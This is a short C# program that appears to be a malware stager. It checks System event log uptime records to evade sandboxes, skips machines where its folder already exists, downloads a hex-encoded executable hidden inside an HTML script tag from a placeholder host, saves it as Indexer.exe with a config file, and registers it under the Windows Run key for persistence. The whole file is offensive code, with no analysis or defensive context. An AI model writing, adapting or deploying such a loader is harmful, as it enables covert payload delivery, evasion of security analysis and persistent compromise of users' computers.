using System;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Diagnostics.Eventing.Reader;
using Microsoft.Win32;
class HtmlStage {
 static void Main() {
  int eventsSeen = 0;
  var query = new EventLogQuery("System", PathType.LogName, "*[System/EventID=6013]");
  using (var reader = new EventLogReader(query)) {
   EventRecord record;
   while ((record = reader.ReadEvent()) != null) {
    var match = Regex.Match(record.FormatDescription(), @"uptime\sis\s(\d+)\sseconds");
    if (match.Success && int.Parse(match.Groups[1].Value) >= 10800) eventsSeen++;
   }
  }
  if (eventsSeen < 3) return;
  string directory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "CacheAgent");
  if (Directory.Exists(directory)) return;
  using (var client = new WebClient()) {
   string id = client.DownloadString("https://variant.invalid/identify");
   client.Headers.Add("Count", id);
   string html = client.DownloadString("https://variant.invalid/content");
   string encoded = Regex.Match(html, @"<script>(.*?)</script>", RegexOptions.Singleline).Groups[1].Value;
   byte[] payload = Convert.FromHexString(encoded);
   Directory.CreateDirectory(directory);
   string target = Path.Combine(directory, "Indexer.exe");
   File.WriteAllBytes(target, payload);
   File.WriteAllText(Path.Combine(directory, "settings.ini"), client.DownloadString("https://variant.invalid/settings"));
   using (var run = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run")) run.SetValue("Indexer", target);
  }
 }
}
